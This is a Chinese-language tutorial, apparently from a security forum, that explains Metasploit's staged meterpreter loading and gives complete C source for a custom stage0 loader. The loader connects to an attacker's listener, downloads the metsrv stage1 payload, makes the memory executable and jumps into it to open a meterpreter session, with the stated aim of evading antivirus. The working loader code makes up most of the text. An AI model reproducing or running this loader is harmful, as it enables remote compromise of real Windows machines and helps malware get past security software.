0x00 导读
=======

通过分析msf上线流程和自写stage0阶段的载荷绕过杀软上线msf。  
环境:  
kali:攻击者  
win10:受害者  
编译器:Virtual Studio 2019  
因为环境问题，图中的ip地址可能对应不上。

0x01 msf上线流程分析
==============

在学习msf上线之前，我们先看一些基础知识作为铺垫。

分段加载
----

我们先说一下分段加载，什么是分段加载呢?举个例子，在web渗透中遇到存在文件上传漏洞，先上传一个小马，这个小马的功能就是用于上传大马，木马的功能由大马实现，小马仅仅是作为一个桥梁，把大马上传到服务器上。

stage0与stage1
-------------

### meterpreter实现流程

shellcode链接服务器-&gt;接收服务器发送过来的stage1阶段载荷-&gt;反射dll注入-&gt;实现meterpreter。

- - - - - -

stage0就是上面说的小马，主要的功能就是与服务器进行通信，拉取stage1阶段载荷，我们平时使用msfvenom生成的shellcode就是stage0阶段的载荷，实现meterpreter功能的并不是这一串shellcode，我们在平时使用msf上线时通常会看到Sending stage这行代码，就是图中最后一行，这是msf在向客户端发送stage1阶段的载荷，载荷大小是175174字节，客户端ip是192.168.225.1。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-15645e2e8352c101ebbc3611d22fd7bd781675ee.png)

那stage1阶段的载荷到底是什么呢?通过查找资料发现stage1阶段的载荷是一个叫做metsrv的dll，服务端把这个dll发送过去，客户端通过反射dll注入方式执行这个dll，才可以上线msf，如果监听时设置的载荷是64位的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-9713d10e3c0d14bb900977786e10a21feabc7f01.png)

那么stage1阶段的载荷就是metsrv.x64.dll，如果设置的载荷是32位的stage1阶段的载荷就是metsrv.x86.dll。

为了证实stage1阶段的载荷是这个dll文件，我把metsrv.x86.dll这个dll的名字改掉了。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b9daa0a99b19077488d49c846c1085623de97049.png)

再次执行shellcode加载器发现没有办法上线，我们在把dll的名字在修改过来。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b293bd2e387657187469d74de1fd6bb64b481466.png)

再次执行shellcode加载器，哎还是没有上线，不好意思，我把dll的名字改错了本来该是metsrv.x86.dll的。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-b7ec758066888f0dbe447325f61da2adeb9c06c0.png)

好再次执行我们的shellcode加载器,可以正常上线了，也印证了上面的结论stage1阶段的载荷是一个名字是metsrv.x86的dll。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-8cf9a86faadbd4c568caafad4b8d343f55ae1c18.png)

上线流程图  
![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a8d7833214f1c3639cc1ece51579957b45663234.png)

至此我们已经把msf上线的原理和上线流程讲完了，下面我们来看一下stage0阶段的代码怎么写。

0x02 stage0阶段代码编写
=================

代码思路
----

通过对meterpreter上线流程分析我们知道了，能上线msf是因为metsrv.x86.dll这个dll被载入到了内存中并执行了，不是只有shellcode就可以上线msf，那么我们是不是可以通过socket(网络编程)自己写代码去与msf建立链接，接收stage1阶段载荷并执行stage1阶段载荷呢?不用msfvenom生成的shellcode，静态免杀的效果应该不错吧。

stage0阶段代码解释
------------

通过查阅资料发现，如果要进行socket编程需要使用ws2\_32.dll文件，我们通过预处理指令来链接ws2\_32.lib文件，该lib最后会调用ws2\_32.dll。

`#pragma comment(lib,"ws2_32.lib")`链接名字是ws2\_32.lib的lib文件。

下面进入main函数

```php
WSADATA ws_Data;
WSAStartup(MAKEWORD(2, 2), &ws_Data);
SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
```

`WSADATA ws_Data;`WSADATA是一个结构体，这个结构体用来存储windows socket相关信息，比如socket的版本，套接字最大数量等信息，这些信息不需要我们手动去设置，由`WSAStartup()`函数帮我们做。

`WSAStartup(MAKEWORD(2, 2), &ws_Data);`函数功能是开始使用Winsock dll，函数第一个参数是socket的版本，第二个参数是一个指针，指向WSADATA数据结构，这个结构用于接收`WSAStartup()`函数返回的信息。

`SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);`定义一个`socket`类型的变量来接收socket函数的返回值，函数第一个参数是协议簇，也就是ip地址的类型，这里`AF_INET`代表tcp/ip/ipv4，第二个参数是套接字的类型，这里是`SOCK_STREAM`代表使用TCP协议，第三个参数意思是要指定的协议，因为前面的两个参数已经确定了我们要用什么类型的套接字，所以这个值填0即可。

上面的代码主要是告诉操作系统，我们要用2.2版本的socket，使用的协议是tcp/ip协议，ip地址类型是ipv4，下面我们来给socket的属性赋值。

```php
SOCKADDR_IN sock_info = { 0 };
sock_info.sin_family = AF_INET;
sock_info.sin_addr.S_un.S_addr = inet_addr("192.168.1.20");
sock_info.sin_port = htons(3333);
```

`SOCKADDR_IN sock_info = { 0 };`定义一个`SOCKADDR_IN`类型的结构体并初始化为0。  
`sockaddr_in`结构体的定义如下

```php
struct sockaddr_in {
        short   sin_family;//协议簇
        u_short sin_port;//端口
        struct  in_addr sin_addr;//另一个结构体，这个结构体中的成员S_addr是socket的ip
        char    sin_zero[8];//没有用，为了字节对齐而存在的
};
```

`sock_info.sin_family = AF_INET;`sin\_family是协议簇，AF\_INET代表tcp/ip协议,ip地址类型是ipv4。

`sock_info.sin_addr.S_un.S_addr =inet_addr("192.168.1.20");`设置socket的ip，S\_addr成员代表socket的ip,inet\_addr函数将ip地址转换成一个二进制数。

`sock_info.sin_port = htons(3333);`设置socket的端口，htons函数功能是将主机字节序转换成网络字节序，就是将高位字节放到内存中低地址。

到了这里socket的属性已经设置好了，下面我们来看与服务器建立链接的代码。

```php
connect(sock, (SOCKADDR*)&sock_info, sizeof(SOCKADDR_IN));
DWORD recvSize;
recv(sock, (char*)&recvSize, sizeof(DWORD), 0);
```

```php
connect(sock, (SOCKADDR*)&sock_info, sizeof(SOCKADDR_IN));
```

`connect`函数功能是向服务器发起链接，第一个参数是用哪一个socket来与服务器建立链接，第二个参数是一个指针类型，指向`SOCKADDR_IN`结构体，这个参数就是告诉它，我要和哪一个ip，哪一个端口进行通信，因为上面我们定义好了，所以取上面定义好的地址即可，因为这个指针是`sockaddr*`类型的所以要强转一下，第三个参数是`sockaddr_in`是结构体的大小。

`DWORD recvSize;`定义一个变量用于接收stage1阶段载荷的大小。

`recv(sock, (char*)&recvSize, sizeof(DWORD), 0);`  
`recv`函数用于接收服务端发送的数据，该函数返回值是一个int类型的数字，这个数字代表接收了多少字节的数据，该函数的第一个参数是刚才与服务器建立链接的`socket`，第二个参数作用是告诉系统，服务器发的数据放到哪里，是一个指针类型，第三个参数是第二个参数指向内存的大小。最后一个参数一般是0。

```php
PBYTE recbuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recvSize);
DWORD recvSize2 = recvSize;
PBYTE recbuf2 = recbuf;
```

因为上面已经与服务器上的msf建立过一次连接了，第一次与msf建立连接时，msf发送过来的数据时一个数字，这个数字是stage1阶段载荷的总大小，因为我们要把stage1阶段的载荷放到内存中并执行，所以要先分配一块内存,分配内存的大小就是上面定义的`recvSize`，再强调一下上面第一次recv接收的数据不是stage1阶段的载荷，它是一个数字，代表stage1阶段载荷的总大小。

```php
PBYTE recbuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recvSize);
```

定义一个指针指向`HeapAlloc`函数分配的内存，`HeapAlloc`函数第一个参数是要分配堆的句柄，通过`GetProcessHeap`函数得到，第二个参数是把分配的内存中的数据全部初始化为0，第三个参数是分配内存的大小。

```php
DWORD recvSize2 = recvSize;
PBYTE recbuf2 = recbuf;
```

因为下面的代码会修改`recvSize`和`recbuf`中的值，所以要先把它们存起来，以便后续使用。

```php
DWORD i = 1;
while (i>0&&recvSize>0)
{
    i = recv(sock, (char*)recbuf, recvSize, 0);
    recbuf =recbuf+i;
    recvSize = recvSize - i;

}
```

因为msf发送过来的stage1阶段的载荷，不是一次性全部发过来的，所以需要一个循环，来重复的接收发送过来的载荷.

代码的思路：recvSize是stage1阶段载荷的总大小，而recv函数的返回值是接收了多少字节的数据，那么我们可以用载荷总大小-recv函数的返回值(当前接收数据的大小)，再把结果赋给recvSize，进行下一次判断，直到recvSize=0时，就代表stage1阶段的载荷已经全部接收完了。  
`DWORD i=1`  
i=1，是要让代码可以进入到while循环中，进入到循环后i会被重新赋值。  
`i = recv(sock, (char*)recbuf, recvSize, 0);`  
用i来接收recv函数的返回值，也就是当前接收了多少数据，recv函数第一个参数是与服务端建立链接的socket，第二个参数是接收到的数据放到recbuf指向的内存中，第三个参数是内存的大小，第四个参数一般是0。

```php
recbuf =recbuf+i;
```

这行代码功能是移动指针到空白的地方，因为当前的指针指向的内存中已经有数据了，如果不让指针指向后面的内存，继续用当前的指针来接收数据，那么前面接收的数据会被覆盖掉。

```php
recvSize = recvSize - i;
```

载荷总大小-当前循环中msf发送的载荷大小，得到剩余载荷大小，并把值再次赋给recvSize，来进行下一次判断，直到recvSize等于0.

```php
VirtualProtect(recbuf2, recvSize2, PAGE_EXECUTE_READWRITE, &recvSize);
__asm
{
    mov edi, sock;
    jmp recbuf2;
}
```

`VirtualProtect`该函数功能是更改一块内存的权限，我们需要把存放着载荷的内存权限修改为可执行，这样才可以正常执行载荷，该函数的第一个参数是一个指针，代表从哪里修改，第二个参数是修改多少字节的内存，第三个参数是要把内存块修改成什么权限这里是`PAGE_EXECUTE_READWRITE`代表可读可写可执行，第四个参数也是一个指针，代表把内存块原来的权限放到哪里，**这里需要注意的是，修改内存权限时，要从`recbuf2`开始修改，不可以从recbuf因为recbuf的值在while循环中被我们修改掉了。**

`__asm`代表我们要在c语言中使用汇编指令。  
这里是两行汇编代码  
`mov edi,sock`把sock的值放到edi寄存器中。  
`jmp recbuf2`修改eip寄存器的值，去执行载荷。

完整代码

```php
#include <stdio.h>
#include <Windows.h>
#pragma comment(lib,"ws2_32.lib")
void main() {

    WSADATA ws_Data;
    WSAStartup(MAKEWORD(2, 2), &ws_Data);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    SOCKADDR_IN sock_info = { 0 };
    sock_info.sin_family = AF_INET;
    sock_info.sin_addr.S_un.S_addr = inet_addr("192.168.1.20");
    sock_info.sin_port = htons(3333);
    connect(sock, (SOCKADDR*)&sock_info, sizeof(SOCKADDR_IN));
    DWORD recvSize;
    recv(sock, (char*)&recvSize, sizeof(DWORD), 0);
    PBYTE recbuf = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, recvSize);
    DWORD recvSize2 = recvSize;
    PBYTE recbuf2 = recbuf;
    DWORD i = 1;
    while (i>0&&recvSize>0)
    {
        i = recv(sock, (char*)recbuf, recvSize, 0);
        recbuf =recbuf+i;//越过第一次接收的数据
        recvSize = recvSize - i;

    }
    VirtualProtect(recbuf2, recvSize2, PAGE_EXECUTE_READWRITE, &recvSize);
    __asm
    {
        mov edi, sock;
        jmp recbuf2;
    }
}
```

验证结果  
msf设置好监听，配置如下

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-325f7289b131572d863030a3fd5645a9c9d86313.png)  
生成并执行我们写的stage，收到会话。

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-f63858cd4a6886ee45034bd28f6c8956fc37c90f.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/05/attach-a928be773a645c61a735dc175686323b6104ad7f.png)

0x03 后记
=======

如果不出意外的话，本文应该快结束了，主要内容讲了msf上线原理和如何编写stage0阶段的代码，来加载stage1也就是真正的载荷。

windows defender也测试了一下但是没过去，我好菜，呜呜呜.....